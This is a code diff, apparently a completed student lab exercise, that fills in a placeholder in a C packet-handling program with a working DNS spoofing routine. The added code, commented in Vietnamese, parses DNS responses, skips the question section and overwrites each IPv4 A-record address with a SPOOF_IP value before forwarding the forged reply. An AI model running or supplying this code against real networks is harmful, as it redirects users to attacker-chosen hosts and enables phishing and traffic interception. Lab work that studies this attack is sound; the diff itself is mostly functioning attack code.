@@ -39,6 +39,20 @@ struct dns_rr {
     unsigned char rdata[];
 };
 
+// Hàm kiểm tra xem packet có phải DNS response không
+int is_dns_response(unsigned char *buffer) {
+    struct dns_header *dns = (struct dns_header *)buffer;
+    return (ntohs(dns->flags) & 0x8000); // Check QR bit (1 = response)
+}
+
+// Hàm in buffer dưới dạng hex
+void print_buffer_in_hex(unsigned char *buffer, int len) {
+    for (int i = 0; i < len; i++) {
+        printf("%02x ", buffer[i]);
+        if ((i + 1) % 16 == 0) printf("\n");
+    }
+    printf("\n");
+}
 
 int main() {
     int sockfd;
@@ -89,15 +103,53 @@ int main() {
         if (is_dns_response(dns_payload)){
             printf("DNS Response Detected, original:\n");
             print_buffer_in_hex(dns_payload, 96);
-        }    
-        
 
-        /* ------------------------------------------
-           Students implement DNS spoofing here:
-           - Parse DNS response
-           - Modify IP address in response
-           - Recalculate DNS checksum if needed
-        ------------------------------------------ */
+            // --- Bắt đầu phần DNS Spoofing ---
+            struct dns_header *dns = (struct dns_header *)dns_payload;
+            unsigned char *reader = dns_payload + sizeof(struct dns_header);
+            
+            // Bỏ qua phần Question
+            int qdcount = ntohs(dns->qdcount);
+            for (int i = 0; i < qdcount; i++) {
+                // Bỏ qua QNAME (chuỗi tên miền dạng length-value)
+                while (*reader != 0) reader++;
+                reader++; // Bỏ qua byte 0 kết thúc
+                reader += 4; // Bỏ qua QTYPE và QCLASS
+            }
+
+            // Xử lý phần Answer
+            int ancount = ntohs(dns->ancount);
+            for (int i = 0; i < ancount; i++) {
+                // Bỏ qua Name (có thể là con trỏ nén)
+                if ((*reader & 0xC0) == 0xC0) {
+                    reader += 2; // Bỏ qua con trỏ 2 byte
+                } else {
+                    while (*reader != 0) reader++;
+                    reader++; // Bỏ qua byte 0
+                }
+
+                struct dns_rr *rr = (struct dns_rr *)reader;
+                reader += sizeof(struct dns_rr); // Sửa lỗi ở đây
+
+                // Nếu là bản ghi A (IPv4 address)
+                if (ntohs(rr->type) == 1 && ntohs(rr->rdlength) == 4) {
+                    printf("Original IP: %d.%d.%d.%d\n", 
+                           rr->rdata[0], rr->rdata[1], rr->rdata[2], rr->rdata[3]);
+                    
+                    // Thay bằng SPOOF_IP
+                    struct in_addr spoof_addr;
+                    inet_pton(AF_INET, SPOOF_IP, &spoof_addr);
+                    memcpy(rr->rdata, &spoof_addr.s_addr, 4);
+                    
+                    printf("Spoofed to IP: %s\n", SPOOF_IP);
+                }
+                reader += ntohs(rr->rdlength);
+            }
+
+            printf("Modified response:\n");
+            print_buffer_in_hex(dns_payload, 96);
+            // --- Kết thúc phần DNS Spoofing ---
+        }    
 
         // Send modified response back to client
         sendto(sockfd, response, m, 0, 
